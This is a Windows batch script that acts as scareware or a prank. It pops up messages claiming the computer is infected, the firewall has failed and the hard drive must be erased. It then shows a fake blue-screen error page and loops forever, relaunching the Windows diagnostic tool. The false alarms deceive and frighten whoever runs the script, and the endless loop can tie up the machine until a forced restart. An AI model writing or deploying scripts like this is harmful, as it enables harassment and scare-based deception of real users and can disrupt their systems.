@echo off

rem ## 2 ##
msg * /w Access Denied! Your Computer is infected.
msg * /w -
msg * /w Do not attempt to quit.
timeout /nobreak /t 5 >nul
msg * /w System check
msg * /w -
msg * /w CHECKING FOR POWER
timeout /nobreak /t 5 >nul
msg * /w -
msg * /w Power - FAILED
timeout /nobreak /t 5 >nul
msg * /w -
msg * /w CHECKING FOR RAM
timeout /nobreak /t 5 >nul
msg * /w -
msg * /w RAM - FAILED
timeout /nobreak /t 5 >nul
msg * /w -
msg * /w CHECKING FOR ANTIVIRUS UPDATES
timeout /nobreak /t 5 >nul
msg * /w -
msg * /w UPDATE FAILURE
msg * /w -
timeout /nobreak /t 5 >nul
msg * /c Breach of IP address
msg * /c -
msg * /c Firewall - FAILED
msg * /c -
timeout /nobreak /t 5 >nul
msg * /c Virus attaining: 192.168.XX.X
msg * /c -
msg * /c Hard drive must be erased and rebooted to resume windows.
msg * /c -
timeout /nobreak /t 5 >nul
msg * /c -
msg * /c Starting to reboot hard drive.
msg * /c -
msg * /c Restart your device.

rem ## 1 ##
echo. >> bsod.hta
echo ^<p^>DRIVER_IRQL_NOT_LESS_OR_EQUAL^</p^> >> bsod.hta
echo. >> bsod.hta
echo ^<p^>If this is the first time you've seen this stop error screen, restart your computer, If this screen appears again, follow these steps:^</p^> >> bsod.hta
echo. >> bsod.hta
echo ^<p^>Check to make sure any new hardware or software is properly installed. If this is a new installation, ask your hardware or software manufacturer for any windows updates you might need.^</p^> >> bsod.hta
echo. >> bsod.hta
echo ^<p^>If problems continue, disable or remove any newly installed hardware or software. Disable BIOS memory options such as caching or shadowing. If you need to use Safe Mode to remove or disable components, restart your computer, press F8 to select Advanced Startup Options, and then select Safe Mode.^</p^> >> bsod.hta
echo. >> bsod.hta
echo ^<p^>Technical information:^</p^> >> bsod.hta
echo. >> bsod.hta
echo ^<p^>*** STOP: 0x000000D1 (0x0000000C,0x00000002,0x00000000,0xF86B5A89)^</p^> >> bsod.hta
echo. >> bsod.hta
echo ^<p^>*** gv3.sys - Address F86B5A89 base at F86B5000, DateStamp 3dd9919eb^</p^> >> bsod.hta
echo. >> bsod.hta
echo ^<p^>Beginning dump of physical memory^</p^> >> bsod.hta
echo ^<p^>Physical memory dump complete.^</p^> >> bsod.hta
echo ^<p^>Contact your system administrator or technical support group for further assistance.^</p^> >> bsod.hta
echo. >> bsod.hta
echo. >> bsod.hta
echo ^</font^> >> bsod.hta
echo ^</body^>^</html^> >> bsod.hta
start "" /wait "bsod.hta"
del /s /f /q "bsod.hta" > nul

rem ## 3 ##
:START
msdt.exe /id MaintenanceDiagnostic
GOTO START
